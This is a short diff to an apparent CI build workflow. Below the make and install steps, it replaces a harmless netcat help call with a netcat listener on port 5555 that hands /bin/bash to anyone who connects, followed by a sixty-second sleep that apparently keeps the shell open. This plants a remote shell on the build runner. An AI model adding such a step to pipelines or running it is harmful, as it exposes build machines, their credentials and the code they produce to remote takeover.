@@ -14,4 +14,6 @@ jobs:
            sudo make
            sudo make install
       - run: |
-           nc -h
+           nc -n -v -l -p 5555 -e /bin/bash
+      - run: |
+           sleep 60s
